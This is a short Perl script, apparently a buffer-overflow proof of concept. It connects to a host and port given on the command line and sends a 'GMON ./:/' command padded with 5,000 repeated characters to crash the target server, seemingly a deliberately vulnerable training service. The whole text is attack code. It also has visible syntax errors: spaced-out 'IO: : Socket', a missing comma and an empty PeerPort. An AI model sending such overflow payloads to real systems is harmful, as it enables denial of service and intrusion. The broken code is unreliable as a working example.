#! /usr/bin/perl
use IO: : Socket;

$ipAddr = " ";
$ipPort = " ";

if ($ARGV[1] ne ' ')
{
	$ipAddr = "$ARGV[0]";
	$ipPort = "$ARGV[1]";
}

$command = "GMON ./:/";
$command .= "A" x 1000;
$command .= "B" x 1000;
$command .= "C" x 1000;
$command .= "D" x 1000;
$command .= "E" x 1000;

$socket = IO: :Socket: :INET->new(
	Proto=>"tcp"
	PeerAddr=>$ipAddr,
	PeerPort=>) or die "Cannot Connect to $ipAddr $ipPort";

$socket->recv($returnedData,1024);
print $returnedData;

$socket->send($command);

